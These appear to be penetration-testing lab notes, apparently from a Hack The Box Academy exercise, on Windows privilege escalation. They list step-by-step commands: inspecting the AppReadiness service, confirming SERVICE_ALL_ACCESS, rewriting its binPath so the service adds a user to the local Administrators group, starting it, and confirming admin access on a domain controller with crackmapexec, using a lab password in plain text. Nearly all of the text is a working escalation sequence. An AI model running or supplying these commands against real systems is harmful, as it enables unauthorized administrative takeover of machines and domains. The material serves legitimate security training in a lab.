**Querying the AppReadiness Services
```
sc qc AppReadiness
```
- This service starts as SYSTEM

**Checking Service Permissions with PsService
- https://docs.microsoft.com/en-us/sysinternals/downloads/psservice
```
c:\Tools\PsService.exe security AppReadiness
```
- We have SERVICE_ALL_ACCESS

**Checking Local Admin Group Membership
```
net localgroup Administrators
```

**Modifying the Service Binary Path
```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

**Starting the Service
```
sc start AppReadiness
```

**Confirming Local Admin Group Membership
```
net localgroup Administrators
```

**Confirming Local Admin Access on Domain Controller
```
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```
